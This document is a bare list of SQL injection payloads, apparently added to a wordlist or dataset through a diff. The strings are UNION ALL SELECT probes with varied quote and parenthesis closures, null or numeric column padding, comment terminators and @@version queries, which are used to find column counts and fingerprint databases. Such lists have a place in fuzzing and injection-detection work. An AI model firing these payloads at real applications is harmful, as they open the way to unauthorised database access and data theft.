+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--
+-3834'   )    )     )   union all select 8313,8313--
+1"   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--
+-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#
+-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#
+-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#
+-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#
+1"  )   where 1700  =  1700 union all select null,null,null,null,null#
+1" where 4808  =  4808 union all select null,null,null,null,null,null,null#
+-9958"  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#
+ select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'
+1"   )    )    union all select null,null,null,null,null,null,null,null--
+-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--
+-8005"  )   union all select 5213,5213,5213,5213,5213--
+ select * from users where id  =  1 union select 1`\`,version  (    )   -- 1
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+1' where 1093  =  1093 union all select null,null,null,null,null,null,null--
+-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#
+1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--
+-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#
+-8034"  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#
+union all select @@version--
+1"  )   as hymr where 5497  =  5497 union all select null,null,null,null--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-3666'  )   where 6386  =  6386 union all select 6386--
+-6593"  )   union all select 6216,6216,6216,6216,6216,6216,6216#
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+-1390%"   )    )    union all select 8930,8930,8930,8930,8930#
+1'  )   as xhmm where 8092  =  8092 union all select null,null,null--
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+-2006'   )    )    union all select 7852,7852,7852,7852,7852--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
